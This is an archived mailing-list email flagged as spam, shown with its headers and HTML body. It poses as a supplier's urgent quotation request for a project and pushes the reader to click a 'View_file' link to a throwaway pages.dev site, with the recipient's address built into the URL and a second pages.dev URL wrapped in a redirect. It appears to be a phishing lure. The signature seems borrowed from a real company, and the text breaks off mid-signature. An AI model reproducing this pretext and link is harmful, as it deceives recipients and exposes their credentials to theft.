Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 62FA88CAFFA
	for <lists+industrypack-devel@lfdr.de>; Tue, 21 May 2024 16:05:43 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1s9Q7Z-0000jM-DT
	for lists+industrypack-devel@lfdr.de;
	Tue, 21 May 2024 14:05:41 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <duong.tl@lk-tech.com>) id 1s9Q7Y-0000jA-9l
 for industrypack-devel@lists.sourceforge.net;
 Tue, 21 May 2024 14:05:40 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=IXI7YqB2XK1Xa5viEB65cscg5pGs4Pfu3Wv9C/OvSPI=; b=j8X+1G4sCyIAGxH8eR6KwFOX5U
 9SO3IXM8oa0FdzcC4WyK1LxvjiHpAs/7dwficiHLR/DchvahIY/ZVrziire3OiIHiD2vUnFiszJLO
 //slAJ4EGAzGMQrBSZWburO+dRbsw9wQbiVgp0IlruX/N2ldP2Sp4S0Kw5wUa89eABlU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=IXI7YqB2XK1Xa5viEB65cscg5pGs4Pfu3Wv9C/OvSPI=; b=a
 +TKExFAzCruL4YThr+2RnP/yb1o95MFNCIz1Idzte6h8d6QBK9//R8gR9aDgdi0eba/Zsjy/tS0Os
 jiKuE4MPPxX9GT2Nx7QlaQ7hYipYh1gh5+vo2ZvrpgcYxKNdjOTNjbGxDbL5P9CmchuaStQW4ylPs
 QNQ+ar4BUzxHSKWk=;
Received: from [87.236.146.38] (helo=s882124.srvape.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1s9Q7Y-0007Vl-C3 for industrypack-devel@lists.sourceforge.net;
 Tue, 21 May 2024 14:05:40 +0000
Received: from lk-tech.com (localhost [IPv6:::1])
 by s882124.srvape.com (Postfix) with ESMTP id D9003320AA4
 for <industrypack-devel@lists.sourceforge.net>;
 Tue, 21 May 2024 15:46:52 +0200 (CEST)
From: Ly Thai Duong<duong.tl@lk-tech.com>
To: industrypack-devel@lists.sourceforge.net
Date: 21 May 2024 06:46:48 -0700
Message-ID: <20240521064648.DF8AE5CE6BB21B60@lk-tech.com>
MIME-Version: 1.0
X-Spam-Score: 8.4 (++++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Dear industrypack-devel We have new project that want to use
 your products as BOQ attached. attach is the drawing need to be customize
 2000- 3000K. Please help to check and send quotation as soon as possible.
 Thank you. 
 Content analysis details:   (8.4 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: pages.dev]
 0.0 RCVD_IN_DNSWL_BLOCKED  RBL: ADMINISTRATOR NOTICE: The query to
 DNSWL was blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [87.236.146.38 listed in list.dnswl.org]
 0.0 T_SPF_PERMERROR        SPF: test of record failed (permerror)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [87.236.146.38 listed in wl.mailspike.net]
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.6 GOOG_REDIR_NORDNS      Google redirect to obscure spamvertised
 website + no rDNS
 2.0 PDS_DBL_URL_TNB_RUNON  Double-url and To no arrows, from runon
 2.0 MIXED_HREF_CASE        Has href in mixed case
 2.4 TO_NO_BRKTS_FROM_MSSP  Multiple header formatting problems
 0.0 NORDNS_LOW_CONTRAST    No rDNS + hidden text
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only 0.0 FROM_MISSP_EH_MATCH    From misspaced, matches envelope
 0.0 T_REMOTE_IMAGE         Message contains an external image
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1s9Q7Y-0007Vl-C3
Subject: [Industrypack-devel] [SPAM] Request the quotation for project MO
 Bai Nom________________
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6241820303534788090=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============6241820303534788090==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.16438"></HEAD>
<body style=3D"MARGIN: 0.5em">
<P style=3D"MARGIN-BOTTOM: 0px; FONT-SIZE: 13px; FONT-FAMILY: monospace; MA=
RGIN-TOP: 0px"><SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: "Calibri=
 Light",sans-serif; COLOR: rgb(0,112,192)'>Dear industrypack-devel</SPAN></=
P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm"><SPAN lang=3DEN-GB style=3D"=
BOX-SIZING: border-box"></SPAN>&nbsp;</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm">We have new project that wan=
t to use your products as BOQ attached. attach is the drawing need to be cu=
stomize 2000-<BR><BR>3000K. Please help to check and send quotation as soon=
 as possible. Thank you.<SPAN lang=3DEN-GB style=3D"BOX-SIZING: border-box"=
></SPAN></P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm"><SPAN lang=3DEN-GB style=3D"=
BOX-SIZING: border-box"></SPAN>&nbsp;</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm">Here is the project/our comp=
any information for your reference in the below link:<SPAN lang=3DEN-GB sty=
le=3D"BOX-SIZING: border-box"></SPAN></P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm"><SPAN lang=3DEN-GB style=3D"=
BOX-SIZING: border-box"></SPAN>&nbsp;</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm 0cm 0cm 36pt"><A href=3D"http=
s://purple-share-9797.pages.dev/?duf=3D2166desperate&amp;psa=3Dindustrypack=
-devel@lists.sourceforge.net" target=3D_blank data-saferedirecturl=3D"https=
://www.google.com/url?q=3Dhttps://sheathered-cell-4436.pages.dev/?cis%3Djoa=
asulsq%26psa%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D17139397471=
12000&amp;usg=3DAOvVaw3_RwA1hNR3bLZQBSG5MJ7e">View_file</A>
<SPAN lang=3DEN-GB style=3D"BOX-SIZING: border-box"></SPAN></P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm 0cm 0cm 36pt"><SPAN lang=3DEN=
-GB style=3D"BOX-SIZING: border-box"></SPAN>&nbsp;</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm"><SPAN lang=3DEN-GB style=3D"=
BOX-SIZING: border-box"></SPAN>&nbsp;</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm">If you have any question, pl=
ease contact me. Hope to receive your reply soonest!<SPAN lang=3DEN-GB styl=
e=3D"BOX-SIZING: border-box"></SPAN></P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm"><SPAN lang=3DEN-GB style=3D"=
BOX-SIZING: border-box"></SPAN>&nbsp;</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm"><SPAN lang=3DEN-GB style=3D"=
BOX-SIZING: border-box"></SPAN>&nbsp;</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm"><SPAN style=3D'BOX-SIZING: b=
order-box; FONT-FAMILY: "Calibri Light",sans-serif; COLOR: rgb(0,112,192)'>=
Thank you and best regards,</SPAN><SPAN lang=3DEN-GB style=3D"BOX-SIZING: b=
order-box"></SPAN></P><SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: "=
Calibri Light",sans-serif; COLOR: rgb(0,112,192)'></SPAN><SPAN lang=3DEN-GB=
 style=3D"BOX-SIZING: border-box">
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
ans-serif; COLOR: rgb(0,106,157); MARGIN: 0cm"><SPAN lang=3DEN-GB style=3D"=
BOX-SIZING: border-box"><SPAN style=3D"BOX-SIZING: border-box; FONT-FAMILY:=
 Arial, sans-serif; COLOR: rgb(31,56,100)"><B style=3D"BOX-SIZING: border-b=
ox; FONT-WEIGHT: bolder"></B></SPAN>&nbsp;</P>
<DIV class=3Dx_elementToProof style=3D"FONT-SIZE: 11pt; BORDER-TOP: 0px; FO=
NT-FAMILY: Aptos, Aptos_EmbeddedFont, Aptos_MSFontService, Calibri, Helveti=
ca, sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: n=
ormal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WE=
IGHT: 400; COLOR: rgb(0,0,0) !important; PADDING-BOTTOM: 0px; FONT-STYLE: n=
ormal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; =
ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=20
PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; f=
ont-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stro=
ke-width: 0px; text-decoration-thickness: initial; text-decoration-style: i=
nitial; text-decoration-color: initial; font-stretch: inherit; font-variant=
-numeric: inherit; font-variant-east-asian: inherit">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
T-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: norm=
al; TEXT-ALIGN: left; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
ACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-v=
ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
dth: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial"><SPAN style=
=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif"></SPAN>&nbsp;</=
P>
<table class=3D"v1MsoTableGrid" style=3D"BOX-SIZING: border-box; FONT-SIZE:=
 14px; BORDER-TOP: medium none; FONT-FAMILY: Roboto, sans-serif; BORDER-RIG=
HT: medium none; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: c=
ollapse; BORDER-BOTTOM: medium none; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; BORDER-LEFT: =
medium none; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLO=
R: rgb(255,255,255); font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial" cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; WIDTH: 62.75pt; PADDING-BOTTOM: 0in; P=
ADDING-TOP: 0in; PADDING-LEFT: 5.4pt; PADDING-RIGHT: 5.4pt" valign=3D"top" =
rowspan=3D"4" width=3D"84">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in -5.4pt 0pt -5.65pt"><A style=3D=
"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: ; BACKGROUND-COLOR: =
transparent" name=3Dv1_Hlk140830242><SPAN style=3D"BOX-SIZING: border-box; =
FONT-FAMILY: Arial, sans-serif">
<img id=3D"v1Picture_x0020_1" style=3D"BORDER-TOP-STYLE: none; BOX-SIZING: =
border-box; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none; BORDER-RIGHT=
-STYLE: none; BORDER-LEFT-STYLE: none" src=3D"http://mail.lk-tech.com/webma=
il/?_task=3Dmail&amp;_action=3Dget&amp;_mbox=3DINBOX&amp;_uid=3D10784&amp;_=
token=3D3XGMxnBDdVVCXwM3UEjeEHvnc1YxFdfc&amp;_part=3D13&amp;_embed=3D1&amp;=
_mimeclass=3Dimage" width=3D"78" height=3D"78"></SPAN></A><SPAN lang=3DVI s=
tyle=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif"></SPAN></P>=
</TD>
<td style=3D"BOX-SIZING: border-box; WIDTH: 225pt; PADDING-BOTTOM: 0in; PAD=
DING-TOP: 0in; PADDING-LEFT: 5.4pt; PADDING-RIGHT: 5.4pt" width=3D"300">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 0pt -0.85pt; LINE-HEIGHT: 1=
7px"><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><SPAN lang=3D=
VI style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif; COLOR: =
rgb(32,56,100)">TH&Aacute;I L&Yacute; D&#431;&#416;NG</SPAN></B></P></TD>
<td style=3D"BOX-SIZING: border-box; BORDER-TOP: medium none; BORDER-RIGHT:=
 medium none; BORDER-BOTTOM: medium none; PADDING-BOTTOM: 0in; PADDING-TOP:=
 0in; PADDING-LEFT: 0in; BORDER-LEFT: medium none; PADDING-RIGHT: 0in" widt=
h=3D"1">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 0pt">&nbsp;</P></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; WIDTH: 225pt; PADDING-BOTTOM: 0in; PAD=
DING-TOP: 0in; PADDING-LEFT: 5.4pt; PADDING-RIGHT: 5.4pt" width=3D"300">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 0pt; LINE-HEIGHT: 17px"><SP=
AN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-seri=
f; COLOR: rgb(32,56,100)">Lutron Specialist</SPAN></P>
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 0pt; LINE-HEIGHT: 17px"><SP=
AN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-seri=
f; COLOR: rgb(32,56,100)">IOT Division</SPAN></P></TD>
<td style=3D"BOX-SIZING: border-box; BORDER-TOP: medium none; BORDER-RIGHT:=
 medium none; BORDER-BOTTOM: medium none; PADDING-BOTTOM: 0in; PADDING-TOP:=
 0in; PADDING-LEFT: 0in; BORDER-LEFT: medium none; PADDING-RIGHT: 0in" widt=
h=3D"1">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 0pt">&nbsp;</P></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; WIDTH: 225pt; PADDING-BOTTOM: 0in; PAD=
DING-TOP: 0in; PADDING-LEFT: 5.4pt; PADDING-RIGHT: 5.4pt" width=3D"300">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 0pt; LINE-HEIGHT: 17px"><SP=
AN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-seri=
f; COLOR: rgb(32,56,100)">M: (+84) 934 271168</SPAN></P></TD>
<td style=3D"BOX-SIZING: border-box; BORDER-TOP: medium none; BORDER-RIGHT:=
 medium none; BORDER-BOTTOM: medium none; PADDING-BOTTOM: 0in; PADDING-TOP:=
 0in; PADDING-LEFT: 0in; BORDER-LEFT: medium none; PADDING-RIGHT: 0in" widt=
h=3D"1">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 0pt">&nbsp;</P></TD></TR>
<TR style=3D"BOX-SIZING: border-box; HEIGHT: 14.8pt">
<td style=3D"BOX-SIZING: border-box; HEIGHT: 14.8pt; WIDTH: 225pt; PADDING-=
BOTTOM: 0in; PADDING-TOP: 0in; PADDING-LEFT: 5.4pt; PADDING-RIGHT: 5.4pt" v=
align=3D"top" width=3D"300">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 6pt"><SPAN lang=3DVI style=
=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif; COLOR: rgb(31,5=
6,100)">E: duong.tl</SPAN><SPAN lang=3DVI style=3D"BOX-SIZING: border-box; =
FONT-FAMILY: Arial, sans-serif; COLOR: rgb(31,56,100)">@lk-tech.com</SPAN><=
SPAN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-se=
rif"></SPAN></P></TD>
<td style=3D"BOX-SIZING: border-box; BORDER-TOP: medium none; BORDER-RIGHT:=
 medium none; BORDER-BOTTOM: medium none; PADDING-BOTTOM: 0in; PADDING-TOP:=
 0in; PADDING-LEFT: 0in; BORDER-LEFT: medium none; PADDING-RIGHT: 0in" widt=
h=3D"1">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 0pt">&nbsp;</P></TD></TR>
<TR style=3D"BOX-SIZING: border-box; HEIGHT: 17.05pt">
<td style=3D"BOX-SIZING: border-box; HEIGHT: 17.05pt; WIDTH: 288.2pt; PADDI=
NG-BOTTOM: 0in; PADDING-TOP: 0in; PADDING-LEFT: 5.4pt; PADDING-RIGHT: 5.4pt=
" width=3D"384" colspan=3D"3">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 0pt -5.8pt"><B style=3D"BOX=
-SIZING: border-box; FONT-WEIGHT: bolder"><SPAN lang=3DVI style=3D"BOX-SIZI=
NG: border-box; FONT-FAMILY: Arial, sans-serif; BACKGROUND: navy; COLOR: wh=
ite">&nbsp;&nbsp;Ho Chi Minh - Da Nang - Ha Noi - Phnom Penh &nbsp;</SPAN><=
/B><SPAN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, san=
s-serif; COLOR: rgb(32,56,100)"></SPAN></P></TD></TR>
<TR style=3D"BOX-SIZING: border-box; HEIGHT: 13pt">
<td style=3D"BOX-SIZING: border-box; HEIGHT: 13pt; WIDTH: 288.2pt; PADDING-=
BOTTOM: 0in; PADDING-TOP: 0in; PADDING-LEFT: 5.4pt; PADDING-RIGHT: 5.4pt" w=
idth=3D"384" colspan=3D"3">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 0pt -5.8pt; LINE-HEIGHT: 17=
px"><U style=3D"BOX-SIZING: border-box"><SPAN lang=3DVI style=3D"BOX-SIZING=
: border-box; FONT-FAMILY: Arial, sans-serif; COLOR: rgb(32,56,100)">Tel: (=
+84</SPAN></U><U style=3D"BOX-SIZING: border-box"><SPAN lang=3DVI style=3D"=
BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif; COLOR: rgb(31,56,10=
0)">)<SPAN>&nbsp;</SPAN></SPAN></U>
<SPAN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-s=
erif; COLOR: rgb(31,56,100)">28.22534 101 - 102</SPAN><B style=3D"BOX-SIZIN=
G: border-box; FONT-WEIGHT: bolder"><SPAN lang=3DVI style=3D"BOX-SIZING: bo=
rder-box; FONT-FAMILY: Arial, sans-serif; BACKGROUND: navy; COLOR: white"><=
/SPAN></B></P></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; WIDTH: 288.2pt; PADDING-BOTTOM: 0in; P=
ADDING-TOP: 0in; PADDING-LEFT: 5.4pt; PADDING-RIGHT: 5.4pt" width=3D"384" c=
olspan=3D"3">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in 0in 0pt -5.8pt; LINE-HEIGHT: 17=
px"><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: underline; COLOR: =
blue; BACKGROUND-COLOR: transparent" href=3D"https://www.google.com/maps/pl=
ace/LK+Technology+Co.+Ltd+(VN)/@10.7726678,106.7576959,17.48z/data=3D!4m6!3=
m5!1s0x317525c50c1feb85:0x9d682803f99f7250!8m2!3d10.7727704!4d106.7570267!1=
6s%2Fg%2F11c325n8bw?entry=3Dttu" rel=3Dnoreferrer target=3D_blank>
<SPAN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-s=
erif; COLOR: rgb(31,56,100)">No.24,&nbsp;Street 68, Thanh My Loi Ward, Thu =
Duc City,<BR style=3D"BOX-SIZING: border-box">Ho Chi Minh City, Vietnam</SP=
AN></A><SPAN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial,=
 sans-serif; COLOR: rgb(32,56,100)"></SPAN></P></TD></TR>
<TR style=3D"BOX-SIZING: border-box; HEIGHT: 24.25pt">
<td style=3D"BOX-SIZING: border-box; HEIGHT: 24.25pt; WIDTH: 288.2pt; PADDI=
NG-BOTTOM: 0in; PADDING-TOP: 0in; PADDING-LEFT: 5.4pt; PADDING-RIGHT: 5.4pt=
" valign=3D"top" width=3D"384" colspan=3D"3">
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; MARGIN: 0in -7.7pt 0pt -5.7pt; LINE-HEIGHT:=
 17px"><I style=3D"BOX-SIZING: border-box"><SPAN lang=3DVI style=3D"BOX-SIZ=
ING: border-box; FONT-FAMILY: Arial, sans-serif; BACKGROUND: white; COLOR: =
rgb(32,56,100)">Let us know your feedback<SPAN>&nbsp;</SPAN></SPAN></I>
<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: underline; COLOR: blue=
; BACKGROUND-COLOR: transparent" href=3D"https://lk-tech.com/" rel=3Dnorefe=
rrer target=3D_blank><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolde=
r"><SPAN style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; FONT-FAMIL=
Y: Arial, sans-serif; COLOR: rgb(47,84,150)">
<img id=3D"v1Picture_x0020_90007803" style=3D"BORDER-TOP-STYLE: none; BOX-S=
IZING: border-box; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none; BORDE=
R-RIGHT-STYLE: none; BORDER-LEFT-STYLE: none" border=3D"0" alt=3D"cid:image=
005.png@01D9AE9E.92ED6EC0" src=3D"http://mail.lk-tech.com/webmail/?_task=3D=
mail&amp;_action=3Dget&amp;_mbox=3DINBOX&amp;_uid=3D10784&amp;_token=3D3XGM=
xnBDdVVCXwM3UEjeEHvnc1YxFdfc&amp;_part=3D14&amp;_embed=3D1&amp;_mimeclass=
=3Dimage" width=3D"19" height=3D"19"></SPAN></B></A>
<B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><I style=3D"BOX-SI=
ZING: border-box"><SPAN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAM=
ILY: Arial, sans-serif; BACKGROUND: white; COLOR: rgb(32,56,100)">&nbsp;</S=
PAN></I></B><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: underline;=
 COLOR: blue; BACKGROUND-COLOR: transparent" href=3D"https://www.facebook.c=
om/LightingKnowhow/" rel=3Dnoreferrer target=3D_blank>
<SPAN style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; FONT-FAMILY: =
Arial, sans-serif; COLOR: rgb(47,84,150)">
<img id=3D"v1Picture_x0020_1492178750" style=3D"BORDER-TOP-STYLE: none; BOX=
-SIZING: border-box; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none; BOR=
DER-RIGHT-STYLE: none; BORDER-LEFT-STYLE: none" border=3D"0" alt=3D"cid:ima=
ge006.png@01D9AE9E.92ED6EC0" src=3D"http://mail.lk-tech.com/webmail/?_task=
=3Dmail&amp;_action=3Dget&amp;_mbox=3DINBOX&amp;_uid=3D10784&amp;_token=3D3=
XGMxnBDdVVCXwM3UEjeEHvnc1YxFdfc&amp;_part=3D15&amp;_embed=3D1&amp;_mimeclas=
s=3Dimage" width=3D"19" height=3D"19"></SPAN></A>
<B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><I style=3D"BOX-SI=
ZING: border-box"><SPAN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAM=
ILY: Arial, sans-serif; BACKGROUND: white; COLOR: rgb(32,56,100)">&nbsp;</S=
PAN></I></B><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: underline;=
 COLOR: blue; BACKGROUND-COLOR: transparent" href=3D"https://www.instagram.=
com/lightingknowhow/" rel=3Dnoreferrer target=3D_blank>
